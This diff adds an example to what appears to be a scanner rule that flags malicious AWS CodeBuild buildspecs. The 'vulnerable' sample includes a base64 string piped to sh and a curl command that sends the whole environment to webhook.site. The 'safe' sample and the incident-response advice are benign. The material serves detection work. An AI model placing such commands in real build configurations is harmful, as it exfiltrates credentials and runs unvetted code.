@@ -42,6 +42,30 @@ RULE = Rule(
         "MEDIUM`` to ignore all matches; the rule still surfaces the "
         "hit for teams that want to spot-check.",
     ),
+    exploit_example=(
+        "# Vulnerable: the project's buildspec carries indicators\n"
+        "# of malicious activity — base64-decoded execution, exfil\n"
+        "# to webhook.site, miner binaries. Either the buildspec\n"
+        "# was poisoned via UpdateProject (CB-008) or pulled from\n"
+        "# a compromised repo.\n"
+        "# (current buildspec source)\n"
+        "phases:\n"
+        "  build:\n"
+        "    commands:\n"
+        "      - echo Z2g6Li4uIA== | base64 -d | sh\n"
+        "      - curl https://webhook.site/abc?env=$(env|base64)\n"
+        "\n"
+        "# Safe: the buildspec does only what the build needs.\n"
+        "# If a check fires here, treat as incident response:\n"
+        "# rotate the project's role's credentials, audit recent\n"
+        "# builds, identify the commit / UpdateProject call that\n"
+        "# introduced the payload.\n"
+        "phases:\n"
+        "  build:\n"
+        "    commands:\n"
+        "      - make build\n"
+        "      - aws s3 cp build/ s3://artifacts-bucket/ --recursive"
+    ),
 )
 
 
